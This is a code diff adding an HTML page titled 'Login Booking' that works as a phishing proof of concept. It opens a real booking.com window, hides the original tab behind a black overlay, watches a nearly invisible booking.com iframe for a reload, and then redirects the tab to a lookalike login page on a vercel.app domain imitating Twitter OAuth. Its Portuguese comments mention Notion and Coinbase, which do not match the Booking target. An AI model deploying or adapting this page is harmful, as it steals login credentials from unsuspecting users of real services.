@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Login Booking</title>
+	<style type="text/css">
+		#blackdiv {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: black;
+			z-index: 100;
+			display: none;
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+
+	<a href="#" onclick="launch()">Login to Booking!</a>
+
+	<!-- iframe do Notion (mesmo domínio que o popup) -->
+	<iframe src="https://www.booking.com/logo?ver=1&sid=54504ce1ae2d64a233cd22da23954f0f&t=17521148781/$%5E%&*" onload="switcher()" name="sc_share" style="opacity: 0.01;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+
+		var loadedOnce = false;
+		var launched = false;
+
+		function switcher() {
+			console.log('Switcher chamado - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('Primeira vez carregando iframe');
+			} else {
+				if (launched) {
+					console.log('Segunda vez + launched = true, redirecionando...');
+					top.focus();
+					top.location = "https://twitter-o-auth1.vercel.app/login";
+				}
+			}
+		}
+
+		function launch() {
+			launched = true;
+			console.log('Abrindo Coinbase...');
+			loginWindow = window.open("https://www.booking.com/hotel/nl/westcord-delft.html?aid=304142&label=gen173nr-1FCAEoggI46AdIM1gEaKkBiAEBmAExuAEYyAEP2AEB6AEB-AECiAIBqAIEuALFtrzDBsACAdICJGI0YzQxNjMzLTcyZjAtNDYyMS1iNDkwLWRkNzg2YjU2YzliMtgCBeACAQ&sid=189a9e73e34136a4c35a8dcc48016729&dest_id=-2142932&dest_type=city&dist=0&group_adults=2&group_children=0&hapos=1&hpos=1&no_rooms=1&req_adults=2&req_children=0&room1=A%2CA&sb_price_type=total&sr_order=popularity&srepoch=1752111948&srpvid=bb750c64875f02d4&type=total&ucfs=1&", "login");
+			document.querySelector("#blackdiv").style.display = "block";
+		}
+	</script>
+
+</body>
+</html>
